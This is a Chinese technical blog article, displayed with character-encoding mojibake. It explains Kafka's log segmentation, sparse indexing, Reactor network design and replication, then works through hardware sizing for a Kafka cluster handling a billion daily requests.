<h2 id="Kafkaæ—¥å¿—åˆ†æ®µä¿å­˜"><a href="#Kafkaæ—¥å¿—åˆ†æ®µä¿å­˜" class="headerlink" title="Kafkaæ—¥å¿—åˆ†æ®µä¿å­˜"></a>Kafkaæ—¥å¿—åˆ†æ®µä¿å­˜</h2><p>Kafkaä¸­ä¸€ä¸ªä¸»é¢˜ï¼Œä¸€èˆ¬ä¼šè®¾ç½®åˆ†åŒºï¼›æ¯”å¦‚åˆ›å»ºäº†ä¸€ä¸ª<code>topic_a</code>ï¼Œç„¶ååˆ›å»ºçš„æ—¶å€™æŒ‡å®šäº†è¿™ä¸ªä¸»é¢˜æœ‰ä¸‰ä¸ªåˆ†åŒºã€‚å…¶å®åœ¨ä¸‰å°æœåŠ¡å™¨ä¸Šï¼Œä¼šåˆ›å»ºä¸‰ä¸ªç›®å½•ã€‚æœåŠ¡å™¨1ï¼ˆkafka1ï¼‰åˆ›å»ºç›®å½•topic_a-0:ã€‚ç›®å½•ä¸‹é¢æ˜¯æˆ‘ä»¬æ–‡ä»¶ï¼ˆå­˜å‚¨æ•°æ®ï¼‰ï¼Œkafkaæ•°æ®å°±æ˜¯messageï¼Œæ•°æ®å­˜å‚¨åœ¨logæ–‡ä»¶é‡Œã€‚.logç»“å°¾çš„å°±æ˜¯æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨kafkaä¸­æŠŠæ•°æ®æ–‡ä»¶å°±å«åšæ—¥å¿—æ–‡ä»¶ ã€‚<strong>ä¸€ä¸ªåˆ†åŒºä¸‹é¢é»˜è®¤æœ‰nå¤šä¸ªæ—¥å¿—æ–‡ä»¶ï¼ˆåˆ†æ®µå­˜å‚¨ï¼‰ï¼Œä¸€ä¸ªæ—¥å¿—æ–‡ä»¶é»˜è®¤1G</strong>ã€‚</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1e8fe0fa08d542e68b560c276c66cab1~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<p>æœåŠ¡å™¨2ï¼ˆkafka2ï¼‰ï¼šåˆ›å»ºç›®å½•topic_a-1: </p>
<p>æœåŠ¡å™¨3ï¼ˆkafka3ï¼‰ï¼šåˆ›å»ºç›®å½•topic_a-2:</p>
<h2 id="KafkaäºŒåˆ†æŸ¥æ‰¾å®šä½æ•°æ®"><a href="#KafkaäºŒåˆ†æŸ¥æ‰¾å®šä½æ•°æ®" class="headerlink" title="KafkaäºŒåˆ†æŸ¥æ‰¾å®šä½æ•°æ®"></a>KafkaäºŒåˆ†æŸ¥æ‰¾å®šä½æ•°æ®</h2><p>Kafkaé‡Œé¢æ¯ä¸€æ¡æ¶ˆæ¯ï¼Œéƒ½æœ‰è‡ªå·±çš„offsetï¼ˆç›¸å¯¹åç§»é‡ï¼‰ï¼Œå­˜åœ¨ç‰©ç†ç£ç›˜ä¸Šé¢ï¼Œåœ¨position Positionï¼šç‰©ç†ä½ç½®ï¼ˆç£ç›˜ä¸Šé¢å“ªä¸ªåœ°æ–¹ï¼‰ä¹Ÿå°±æ˜¯è¯´ä¸€æ¡æ¶ˆæ¯å°±æœ‰ä¸¤ä¸ªä½ç½®ï¼š</p>
<p>offsetï¼šç›¸å¯¹åç§»é‡ï¼ˆç›¸å¯¹ä½ç½®ï¼‰</p>
<p>positionï¼šç£ç›˜ç‰©ç†ä½ç½®</p>
<p><strong>ç¨€ç–ç´¢å¼•ï¼š</strong>     Kafkaä¸­é‡‡ç”¨äº†ç¨€ç–ç´¢å¼•çš„æ–¹å¼è¯»å–ç´¢å¼•ï¼Œkafkaæ¯å½“å†™å…¥äº†4kå¤§å°çš„æ—¥å¿—ï¼ˆ.logï¼‰ï¼Œå°±å¾€indexé‡Œå†™å…¥ä¸€ä¸ªè®°å½•ç´¢å¼•ã€‚å…¶ä¸­ä¼šé‡‡ç”¨äºŒåˆ†æŸ¥æ‰¾ã€‚</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/819ccf7b22644993bf934414e4feccf4~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h2 id="é«˜å¹¶å‘ç½‘ç»œè®¾è®¡ï¼ˆå…ˆäº†è§£NIOï¼‰"><a href="#é«˜å¹¶å‘ç½‘ç»œè®¾è®¡ï¼ˆå…ˆäº†è§£NIOï¼‰" class="headerlink" title="é«˜å¹¶å‘ç½‘ç»œè®¾è®¡ï¼ˆå…ˆäº†è§£NIOï¼‰"></a>é«˜å¹¶å‘ç½‘ç»œè®¾è®¡ï¼ˆå…ˆäº†è§£NIOï¼‰</h2><p>ç½‘ç»œè®¾è®¡éƒ¨åˆ†æ˜¯kafkaä¸­è®¾è®¡æœ€å¥½çš„ä¸€ä¸ªéƒ¨åˆ†ï¼Œè¿™ä¹Ÿæ˜¯ä¿è¯Kafkaé«˜å¹¶å‘ã€é«˜æ€§èƒ½çš„åŸå› ï¼Œå¯¹kafkaè¿›è¡Œè°ƒä¼˜ï¼Œå°±å¾—å¯¹kafkaåŸç†æ¯”è¾ƒäº†è§£ï¼Œå°¤å…¶æ˜¯ç½‘ç»œè®¾è®¡éƒ¨åˆ†</p>
<p><strong>Reactorç½‘ç»œè®¾è®¡æ¨¡å¼1ï¼š</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8d1ef2e7534744a68c89cff330f1896f~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<p><strong>Reactorç½‘ç»œè®¾è®¡æ¨¡å¼2ï¼š</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/740f7f42db034e8d99ab339995e37636~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<p><strong>Reactorç½‘ç»œè®¾è®¡æ¨¡å¼3ï¼š</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/788ac1f8fbef4bc78c0b8386c5c1f256~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<p><strong>Kafkaè¶…é«˜å¹¶å‘ç½‘ç»œè®¾è®¡ï¼š</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a729e19b67a24b6f88688c35710edda0~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d23045256a224c818f95e9601cadefa9~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
<h2 id="Kafkaå†—ä½™å‰¯æœ¬ä¿è¯é«˜å¯ç”¨"><a href="#Kafkaå†—ä½™å‰¯æœ¬ä¿è¯é«˜å¯ç”¨" class="headerlink" title="Kafkaå†—ä½™å‰¯æœ¬ä¿è¯é«˜å¯ç”¨"></a>Kafkaå†—ä½™å‰¯æœ¬ä¿è¯é«˜å¯ç”¨</h2><p>åœ¨kafkaé‡Œé¢åˆ†åŒºæ˜¯æœ‰å‰¯æœ¬çš„ï¼Œæ³¨ï¼š<strong>0.8ä»¥å‰æ˜¯æ²¡æœ‰å‰¯æœ¬æœºåˆ¶çš„</strong>ã€‚åˆ›å»ºä¸»é¢˜æ—¶ï¼Œå¯ä»¥æŒ‡å®šåˆ†åŒºï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå‰¯æœ¬ä¸ªæ•°ã€‚å‰¯æœ¬æ˜¯æœ‰è§’è‰²çš„ï¼šleader partitionï¼š1ã€å†™æ•°æ®ã€è¯»æ•°æ®æ“ä½œéƒ½æ˜¯ä»leader partitionå»æ“ä½œçš„ã€‚2ã€ä¼šç»´æŠ¤ä¸€ä¸ªISRï¼ˆin-sync- replica ï¼‰åˆ—è¡¨ï¼Œä½†æ˜¯ä¼šæ ¹æ®ä¸€å®šçš„è§„åˆ™åˆ é™¤ISRåˆ—è¡¨é‡Œé¢çš„å€¼ã€‚ç”Ÿäº§è€…å‘é€æ¥ä¸€ä¸ªæ¶ˆæ¯ï¼Œæ¶ˆæ¯é¦–å…ˆè¦å†™å…¥åˆ°leader partitionä¸­ï¼Œå†™å®Œäº†ä»¥åï¼Œè¿˜è¦æŠŠæ¶ˆæ¯å†™å…¥åˆ°ISRåˆ—è¡¨é‡Œé¢çš„å…¶å®ƒåˆ†åŒºï¼Œå†™å®Œåæ‰ç®—è¿™ä¸ªæ¶ˆæ¯æäº¤ã€‚ follower partitionï¼šä»leader partitionåŒæ­¥æ•°æ®ã€‚</p>
<h2 id="ä¼˜ç§€æ¶æ„æ€è€ƒ-æ€»ç»“"><a href="#ä¼˜ç§€æ¶æ„æ€è€ƒ-æ€»ç»“" class="headerlink" title="ä¼˜ç§€æ¶æ„æ€è€ƒ-æ€»ç»“"></a>ä¼˜ç§€æ¶æ„æ€è€ƒ-æ€»ç»“</h2><p>Kafka â€” é«˜å¹¶å‘ã€é«˜å¯ç”¨ã€é«˜æ€§èƒ½ é«˜å¯ç”¨ï¼šå¤šå‰¯æœ¬æœºåˆ¶ é«˜å¹¶å‘ï¼šç½‘ç»œæ¶æ„è®¾è®¡ ä¸‰å±‚æ¶æ„ï¼šå¤šselector -&gt; å¤šçº¿ç¨‹ -&gt; é˜Ÿåˆ—çš„è®¾è®¡ï¼ˆNIOï¼‰ é«˜æ€§èƒ½ï¼š</p>
<p>å†™æ•°æ®ï¼š</p>
<ol>
<li>æŠŠæ•°æ®å…ˆå†™å…¥åˆ°OS Cache</li>
<li>å†™åˆ°ç£ç›˜ä¸Šé¢æ˜¯é¡ºåºå†™ï¼Œæ€§èƒ½å¾ˆé«˜</li>
</ol>
<p>è¯»æ•°æ®ï¼š</p>
<ol>
<li>æ ¹æ®ç¨€ç–ç´¢å¼•ï¼Œå¿«é€Ÿå®šä½åˆ°è¦æ¶ˆè´¹çš„æ•°æ®</li>
<li>é›¶æ‹·è´æœºåˆ¶ï¼Œå‡å°‘æ•°æ®çš„æ‹·è´ï¼Œå‡å°‘äº†åº”ç”¨ç¨‹åºä¸æ“ä½œç³»ç»Ÿä¸Šä¸‹æ–‡åˆ‡æ¢</li>
</ol>
<h2 id="Kafkaç”Ÿäº§ç¯å¢ƒæ­å»º"><a href="#Kafkaç”Ÿäº§ç¯å¢ƒæ­å»º" class="headerlink" title="Kafkaç”Ÿäº§ç¯å¢ƒæ­å»º"></a>Kafkaç”Ÿäº§ç¯å¢ƒæ­å»º</h2><h3 id="éœ€æ±‚åœºæ™¯åˆ†æ"><a href="#éœ€æ±‚åœºæ™¯åˆ†æ" class="headerlink" title="éœ€æ±‚åœºæ™¯åˆ†æ"></a>éœ€æ±‚åœºæ™¯åˆ†æ</h3><blockquote>
<p>ç”µå•†å¹³å°ï¼Œéœ€è¦æ¯å¤©10äº¿è¯·æ±‚éƒ½è¦å‘é€åˆ°Kafkaé›†ç¾¤ä¸Šé¢ã€‚äºŒå…«æ•ˆåº”ï¼Œä¸€èˆ¬è¯„ä¼°å‡ºæ¥é—®é¢˜éƒ½ä¸å¤§ã€‚10äº¿è¯·æ±‚ -&gt; 24 è¿‡æ¥çš„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯å¤©çš„12:00 åˆ°æ—©ä¸Š8:00 è¿™æ®µæ—¶é—´å…¶å®æ˜¯æ²¡æœ‰å¤šå¤§çš„æ•°æ®é‡çš„ã€‚80%çš„è¯·æ±‚æ˜¯ç”¨çš„å¦å¤–16å°æ—¶çš„å¤„ç†çš„ã€‚16ä¸ªå°æ—¶å¤„ç† -&gt; 8äº¿çš„è¯·æ±‚ã€‚16 * 0.2 &#x3D; 3ä¸ªå°æ—¶ å¤„ç†äº†8äº¿è¯·æ±‚çš„80%çš„æ•°æ®</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´6äº¿çš„æ•°æ®æ˜¯é 3ä¸ªå°æ—¶å¤„ç†å®Œçš„ã€‚ç®€å•çš„ç®—ä¸€ä¸‹é«˜å³°æœŸæ—¶å€™çš„qps<code>6äº¿/3å°æ—¶ =5.5ä¸‡/s qps=5.5ä¸‡</code></p>
<blockquote>
<p>10äº¿è¯·æ±‚ * 50kb &#x3D; 46T æ¯å¤©éœ€è¦å­˜å‚¨46Tçš„æ•°æ®</p>
</blockquote>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéƒ½ä¼šè®¾ç½®ä¸¤ä¸ªå‰¯æœ¬ <strong>46T * 2 &#x3D; 92T</strong> Kafkaé‡Œé¢çš„æ•°æ®æ˜¯æœ‰ä¿ç•™çš„æ—¶é—´å‘¨æœŸï¼Œä¿ç•™æœ€è¿‘<strong>3</strong>å¤©çš„æ•°æ®ã€‚<strong>92T * 3å¤© &#x3D; 276T</strong>æˆ‘è¿™å„¿è¯´çš„æ˜¯50kbä¸æ˜¯è¯´ä¸€æ¡æ¶ˆæ¯å°±æ˜¯50kbï¼Œï¼ˆæŠŠæ—¥å¿—åˆå¹¶äº†ï¼Œå¤šæ¡æ—¥å¿—åˆå¹¶åœ¨ä¸€èµ·ï¼‰ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œä¸€æ¡æ¶ˆæ¯å°±å‡ bï¼Œä¹Ÿæœ‰å¯èƒ½å°±æ˜¯å‡ ç™¾å­—èŠ‚ã€‚</p>
<h3 id="ç‰©ç†æœºæ•°é‡è¯„ä¼°"><a href="#ç‰©ç†æœºæ•°é‡è¯„ä¼°" class="headerlink" title="ç‰©ç†æœºæ•°é‡è¯„ä¼°"></a>ç‰©ç†æœºæ•°é‡è¯„ä¼°</h3><p>1ï¼‰é¦–å…ˆåˆ†æä¸€ä¸‹æ˜¯éœ€è¦è™šæ‹Ÿæœºè¿˜æ˜¯ç‰©ç†æœº åƒKafka mysql hadoopè¿™äº›é›†ç¾¤æ­å»ºçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”Ÿäº§é‡Œé¢éƒ½æ˜¯ä½¿ç”¨ç‰©ç†æœºã€‚</p>
<p>2ï¼‰é«˜å³°æœŸéœ€è¦å¤„ç†çš„è¯·æ±‚æ€»çš„è¯·æ±‚æ¯ç§’5.5ä¸‡ä¸ªï¼Œå…¶å®ä¸€ä¸¤å°ç‰©ç†æœºç»å¯¹æ˜¯å¯ä»¥æŠ—ä½çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯„ä¼°æœºå™¨çš„æ—¶å€™ï¼Œæ˜¯æŒ‰ç…§é«˜å³°æœŸçš„4å€çš„å»è¯„ä¼°ã€‚å¦‚æœæ˜¯4å€çš„è¯ï¼Œå¤§æ¦‚æˆ‘ä»¬é›†ç¾¤çš„èƒ½åŠ›è¦å‡†å¤‡åˆ° 20ä¸‡qpsã€‚è¿™æ ·å­çš„é›†ç¾¤æ‰æ˜¯æ¯”è¾ƒå®‰å…¨çš„é›†ç¾¤ã€‚å¤§æ¦‚å°±éœ€è¦5å°ç‰©ç†æœºã€‚æ¯å°æ‰¿å—4ä¸‡è¯·æ±‚ã€‚</p>
<p><strong>åœºæ™¯æ€»ç»“ï¼š</strong><code>æå®š10äº¿è¯·æ±‚ï¼Œé«˜å³°æœŸ5.5ä¸‡çš„qps,276Tçš„æ•°æ®ï¼Œéœ€è¦5å°ç‰©ç†æœºã€‚</code></p>
<h3 id="ç£ç›˜é€‰æ‹©"><a href="#ç£ç›˜é€‰æ‹©" class="headerlink" title="ç£ç›˜é€‰æ‹©"></a>ç£ç›˜é€‰æ‹©</h3><p>æå®š10äº¿è¯·æ±‚ï¼Œé«˜å³°æœŸ5.5ä¸‡çš„qpsï¼Œ276Tçš„æ•°æ®ï¼Œéœ€è¦5å°ç‰©ç†æœºã€‚</p>
<p>1ï¼‰SSDå›ºæ€ç¡¬ç›˜ï¼Œè¿˜æ˜¯éœ€è¦æ™®é€šçš„æœºæ¢°ç¡¬ç›˜</p>
<p>SSDç¡¬ç›˜ï¼šæ€§èƒ½æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä»·æ ¼è´µ </p>
<p>SASç›˜ï¼šæŸæ–¹é¢æ€§èƒ½ä¸æ˜¯å¾ˆå¥½ï¼Œä½†æ˜¯æ¯”è¾ƒä¾¿å®œã€‚SSDç¡¬ç›˜æ€§èƒ½æ¯”è¾ƒå¥½ï¼ŒæŒ‡çš„æ˜¯å®ƒéšæœºè¯»å†™çš„æ€§èƒ½æ¯”è¾ƒå¥½ã€‚é€‚åˆMySQLè¿™æ ·é›†ç¾¤ã€‚ä½†æ˜¯å…¶å®ä»–çš„é¡ºåºå†™çš„æ€§èƒ½è·ŸSASç›˜å·®ä¸å¤šã€‚kafkaå°±æ˜¯ç”¨çš„é¡ºåºå†™ã€‚æ‰€ä»¥æˆ‘ä»¬å°±ç”¨æ™®é€šçš„æœºæ¢°ç¡¬ç›˜å°±å¯ä»¥äº†ã€‚</p>
<p>2ï¼‰éœ€è¦è¯„ä¼°æ¯å°æœåŠ¡å™¨éœ€è¦å¤šå°‘å—ç£ç›˜ </p>
<p>5å°æœåŠ¡å™¨ï¼Œä¸€å…±éœ€è¦276T ï¼Œå¤§çº¦æ¯å°æœåŠ¡å™¨éœ€è¦å­˜å‚¨60Tçš„æ•°æ®ã€‚</p>
<p>å…¬å¸é‡Œé¢æœåŠ¡å™¨çš„é…ç½®ç”¨çš„æ˜¯11å—ç¡¬ç›˜ï¼Œæ¯ä¸ªç¡¬ç›˜ 7Tã€‚11 * 7T &#x3D; 77T</p>
<blockquote>
<p>77T * 5 å°æœåŠ¡å™¨ &#x3D; 385Tã€‚</p>
</blockquote>
<p><strong>åœºæ™¯æ€»ç»“ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æå®š10äº¿è¯·æ±‚ï¼Œéœ€è¦5å°ç‰©ç†æœºï¼Œ11ï¼ˆSASï¼‰ * 7T</span><br></pre></td></tr></table></figure>

<h3 id="å†…å­˜è¯„ä¼°"><a href="#å†…å­˜è¯„ä¼°" class="headerlink" title="å†…å­˜è¯„ä¼°"></a>å†…å­˜è¯„ä¼°</h3><p>æå®š10äº¿è¯·æ±‚ï¼Œéœ€è¦5å°ç‰©ç†æœºï¼Œ11ï¼ˆSASï¼‰ * 7T</p>
<p>kafkaè¯»å†™æ•°æ®çš„æµç¨‹éƒ½æ˜¯åŸºäºos cacheï¼Œæ¢å¥è¯è¯´å‡è®¾å’±ä»¬çš„os casheæ— é™å¤§é‚£ä¹ˆæ•´ä¸ªkafkaæ˜¯ä¸æ˜¯ç›¸å½“äºå°±æ˜¯åŸºäºå†…å­˜å»æ“ä½œï¼Œå¦‚æœæ˜¯åŸºäºå†…å­˜å»æ“ä½œï¼Œæ€§èƒ½è‚¯å®šå¾ˆå¥½ã€‚å†…å­˜æ˜¯æœ‰é™çš„ã€‚</p>
<p>1ï¼‰ å°½å¯èƒ½å¤šçš„å†…å­˜èµ„æºè¦ç»™ os cache </p>
<p>2ï¼‰ Kafkaæ ¸å¿ƒçš„ä»£ç ç”¨çš„æ˜¯scalaå†™çš„ï¼Œå®¢æˆ·ç«¯çš„ä»£ç javaå†™çš„ã€‚éƒ½æ˜¯åŸºäºjvmã€‚æ‰€ä»¥è¿˜è¦ç»™ä¸€éƒ¨åˆ†çš„å†…å­˜ç»™jvmã€‚Kafkaçš„è®¾è®¡ï¼Œæ²¡æœ‰æŠŠå¾ˆå¤šæ•°æ®ç»“æ„éƒ½æ”¾åœ¨jvmé‡Œé¢ã€‚æ‰€ä»¥è¿™ä¸ªjvmä¸éœ€è¦å¤ªå¤§çš„å†…å­˜ã€‚<strong>æ ¹æ®ç»éªŒï¼Œç»™ä¸ª10Gå°±å¯ä»¥äº†</strong>ã€‚</p>
<blockquote>
<p>NameNodeï¼šjvmé‡Œé¢è¿˜æ”¾äº†å…ƒæ•°æ®ï¼ˆå‡ åGï¼‰ï¼ŒJVMä¸€å®šè¦ç»™å¾—å¾ˆå¤§ã€‚æ¯”å¦‚ç»™ä¸ª100Gã€‚</p>
</blockquote>
<p>å‡è®¾è¿™ä¸ª10è¯·æ±‚çš„è¿™ä¸ªé¡¹ç›®ï¼Œä¸€å…±ä¼šæœ‰100ä¸ªtopicã€‚100 topic * 5 partition * 2 &#x3D; 1000 partition ä¸€ä¸ªpartitionå…¶å®å°±æ˜¯ç‰©ç†æœºä¸Šé¢çš„ä¸€ä¸ªç›®å½•ï¼Œè¿™ä¸ªç›®å½•ä¸‹é¢ä¼šæœ‰å¾ˆå¤šä¸ª.logçš„æ–‡ä»¶ã€‚.logå°±æ˜¯å­˜å‚¨æ•°æ®æ–‡ä»¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸€ä¸ª.logæ–‡ä»¶çš„å¤§å°æ˜¯1Gã€‚å¦‚æœè¦ä¿è¯ 1000ä¸ªpartition çš„æœ€æ–°çš„.log æ–‡ä»¶çš„æ•°æ®å¦‚æœéƒ½åœ¨å†…å­˜é‡Œé¢ï¼Œè¿™ä¸ªæ—¶å€™æ€§èƒ½å°±æ˜¯æœ€å¥½ã€‚1000 * 1G &#x3D; 1000Gå†…å­˜ã€‚ æˆ‘ä»¬åªéœ€è¦æŠŠå½“å‰æœ€æ–°çš„è¿™ä¸ªlog ä¿è¯é‡Œé¢çš„25%çš„æœ€æ–°çš„æ•°æ®åœ¨å†…å­˜é‡Œé¢ã€‚250M * 1000 &#x3D; 0.25 G* 1000 &#x3D;250Gçš„å†…å­˜ã€‚</p>
<p>250å†…å­˜ &#x2F; 5 &#x3D; 50Gå†…å­˜ 50G+10G &#x3D; 60Gå†…å­˜</p>
<p>64Gçš„å†…å­˜ï¼Œå¦å¤–çš„4Gï¼Œæ“ä½œç³»ç»Ÿæœ¬ç”Ÿæ˜¯ä¸æ˜¯ä¹Ÿéœ€è¦å†…å­˜ã€‚å…¶å®Kafkaçš„jvmä¹Ÿå¯ä»¥ä¸ç”¨ç»™åˆ°10Gè¿™ä¹ˆå¤šã€‚è¯„ä¼°å‡ºæ¥64Gæ˜¯å¯ä»¥çš„ã€‚å½“ç„¶å¦‚æœèƒ½ç»™åˆ°128Gçš„å†…å­˜çš„æœåŠ¡å™¨ï¼Œé‚£å°±æœ€å¥½ã€‚</p>
<p>æˆ‘åˆšåˆšè¯„ä¼°çš„æ—¶å€™ç”¨çš„éƒ½æ˜¯ä¸€ä¸ªtopicæ˜¯5ä¸ªpartitionï¼Œä½†æ˜¯å¦‚æœæ˜¯æ•°æ®é‡æ¯”è¾ƒå¤§çš„topicï¼Œå¯èƒ½ä¼šæœ‰10ä¸ªpartitionã€‚</p>
<p>æ€»ç»“ï¼šæå®š10äº¿è¯·æ±‚ï¼Œéœ€è¦5å°ç‰©ç†æœºï¼Œ11ï¼ˆSASï¼‰ * 7T ï¼Œéœ€è¦64Gçš„å†…å­˜ï¼ˆ128Gæ›´å¥½ï¼‰</p>
<h3 id="CPUå‹åŠ›è¯„ä¼°"><a href="#CPUå‹åŠ›è¯„ä¼°" class="headerlink" title="CPUå‹åŠ›è¯„ä¼°"></a>CPUå‹åŠ›è¯„ä¼°</h3><p>è¯„ä¼°ä¸€ä¸‹æ¯å°æœåŠ¡å™¨éœ€è¦å¤šå°‘cpu coreï¼ˆèµ„æºå¾ˆæœ‰é™ï¼‰</p>
<p>è¯„ä¼°éœ€è¦å¤šå°‘ä¸ªcpu ï¼Œä¾æ®å°±æ˜¯çœ‹æœåŠ¡é‡Œé¢æœ‰å¤šå°‘çº¿ç¨‹å»è·‘ã€‚çº¿ç¨‹å°±æ˜¯ä¾æ‰˜cpuå»è¿è¡Œçš„ã€‚å¦‚æœçº¿ç¨‹æ¯”è¾ƒå¤šï¼Œä½†æ˜¯cpu coreæ¯”è¾ƒå°‘ï¼Œè¿™æ ·çš„è¯ï¼Œæœºå™¨è´Ÿè½½å°±ä¼šå¾ˆé«˜ï¼Œæ€§èƒ½å°±ä¸å¥½ã€‚</p>
<p>è¯„ä¼°ä¸€ä¸‹ï¼Œkafkaçš„ä¸€å°æœåŠ¡å™¨å¯åŠ¨ä»¥åä¼šæœ‰å¤šå°‘çº¿ç¨‹ï¼Ÿ</p>
<p>Acceptorçº¿ç¨‹ 1 processorçº¿ç¨‹ 3 6~9ä¸ªçº¿ç¨‹ å¤„ç†è¯·æ±‚çº¿ç¨‹ 8ä¸ª 32ä¸ªçº¿ç¨‹ å®šæ—¶æ¸…ç†çš„çº¿ç¨‹ï¼Œæ‹‰å–æ•°æ®çš„çº¿ç¨‹ï¼Œå®šæ—¶æ£€æŸ¥ISRåˆ—è¡¨çš„æœºåˆ¶ ç­‰ç­‰ã€‚æ‰€ä»¥å¤§æ¦‚ä¸€ä¸ªKafkaçš„æœåŠ¡å¯åŠ¨èµ·æ¥ä»¥åï¼Œä¼šæœ‰ä¸€ç™¾å¤šä¸ªçº¿ç¨‹ã€‚</p>
<p>cpu core &#x3D; 4ä¸ªï¼Œä¸€éæ¥è¯´ï¼Œå‡ åä¸ªçº¿ç¨‹ï¼Œå°±è‚¯å®šæŠŠcpu æ‰“æ»¡äº†ã€‚cpu core &#x3D; 8ä¸ªï¼Œåº”è¯¥å¾ˆè½»æ¾çš„èƒ½æ”¯æŒå‡ åä¸ªçº¿ç¨‹ã€‚å¦‚æœçº¿ç¨‹æ˜¯100å¤šä¸ªï¼Œæˆ–è€…å·®ä¸å¤š200ä¸ªï¼Œé‚£ä¹ˆ8 ä¸ª cpu coreæ˜¯æä¸å®šçš„ã€‚æ‰€ä»¥è¿™å„¿å»ºè®®ï¼šCPU core &#x3D; 16ä¸ªã€‚å¦‚æœå¯ä»¥çš„è¯ï¼Œèƒ½æœ‰32ä¸ªcpu core é‚£å°±æœ€å¥½ã€‚</p>
<p>ç»“è®ºï¼škafkaé›†ç¾¤ï¼Œæœ€ä½ä¹Ÿè¦ç»™16ä¸ªcpu coreï¼Œå¦‚æœèƒ½ç»™åˆ°32 cpu coreé‚£å°±æ›´å¥½ã€‚2cpu * 8 &#x3D;16 cpu core 4cpu * 8 &#x3D; 32 cpu core</p>
<p>æ€»ç»“ï¼šæå®š10äº¿è¯·æ±‚ï¼Œéœ€è¦5å°ç‰©ç†æœºï¼Œ11ï¼ˆSASï¼‰ * 7T ï¼Œéœ€è¦64Gçš„å†…å­˜ï¼ˆ128Gæ›´å¥½ï¼‰ï¼Œéœ€è¦16ä¸ªcpu coreï¼ˆ32ä¸ªæ›´å¥½ï¼‰</p>
<h3 id="ç½‘ç»œéœ€æ±‚è¯„ä¼°"><a href="#ç½‘ç»œéœ€æ±‚è¯„ä¼°" class="headerlink" title="ç½‘ç»œéœ€æ±‚è¯„ä¼°"></a>ç½‘ç»œéœ€æ±‚è¯„ä¼°</h3><p>è¯„ä¼°éœ€è¦ä»€ä¹ˆæ ·ç½‘å¡ï¼Ÿ<strong>ä¸€èˆ¬è¦ä¹ˆæ˜¯åƒå…†çš„ç½‘å¡ï¼ˆ1G&#x2F;sï¼‰ï¼Œè¿˜æœ‰çš„å°±æ˜¯ä¸‡å…†çš„ç½‘å¡ï¼ˆ10G&#x2F;sï¼‰</strong></p>
<p>é«˜å³°æœŸçš„æ—¶å€™ æ¯ç§’ä¼šæœ‰5.5ä¸‡çš„è¯·æ±‚æ¶Œå…¥ï¼Œ5.5&#x2F;5 &#x3D; å¤§çº¦æ˜¯æ¯å°æœåŠ¡å™¨ä¼šæœ‰1ä¸‡ä¸ªè¯·æ±‚æ¶Œå…¥ã€‚<br>æˆ‘ä»¬ä¹‹å‰è¯´çš„ï¼Œ<br>10000 * 50kb &#x3D; 488M  ä¹Ÿå°±æ˜¯æ¯æ¡æœåŠ¡å™¨ï¼Œæ¯ç§’è¦æ¥å—488Mçš„æ•°æ®ã€‚æ•°æ®è¿˜è¦æœ‰å‰¯æœ¬ï¼Œå‰¯æœ¬ä¹‹é—´çš„åŒæ­¥<br>ä¹Ÿæ˜¯èµ°çš„ç½‘ç»œçš„è¯·æ±‚ã€‚488 * 2 &#x3D; 976m&#x2F;s<br>è¯´æ˜ä¸€ä¸‹ï¼š<br>  å¾ˆå¤šå…¬å¸çš„æ•°æ®ï¼Œä¸€ä¸ªè¯·æ±‚é‡Œé¢æ˜¯æ²¡æœ‰50kbè¿™ä¹ˆå¤§çš„ï¼Œæˆ‘ä»¬å…¬å¸æ˜¯å› ä¸ºä¸»æœºåœ¨ç”Ÿäº§ç«¯å°è£…äº†æ•°æ®<br>  ç„¶åæŠŠå¤šæ¡æ•°æ®åˆå¹¶åœ¨ä¸€èµ·äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ä¸€ä¸ªè¯·æ±‚æ‰ä¼šæœ‰è¿™ä¹ˆå¤§ã€‚</p>
<p>è¯´æ˜ä¸€ä¸‹ï¼š<br>   ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç½‘å¡çš„å¸¦å®½æ˜¯è¾¾ä¸åˆ°æé™çš„ï¼Œå¦‚æœæ˜¯åƒå…†çš„ç½‘å¡ï¼Œæˆ‘ä»¬èƒ½ç”¨çš„ä¸€èˆ¬å°±æ˜¯700Må·¦å³ã€‚<br>   ä½†æ˜¯å¦‚æœæœ€å¥½çš„æƒ…å†µï¼Œæˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨ä¸‡å…†çš„ç½‘å¡ã€‚<br>   å¦‚æœä½¿ç”¨çš„æ˜¯ä¸‡å…†çš„ï¼Œé‚£å°±æ˜¯å¾ˆè½»æ¾ã€‚</p>
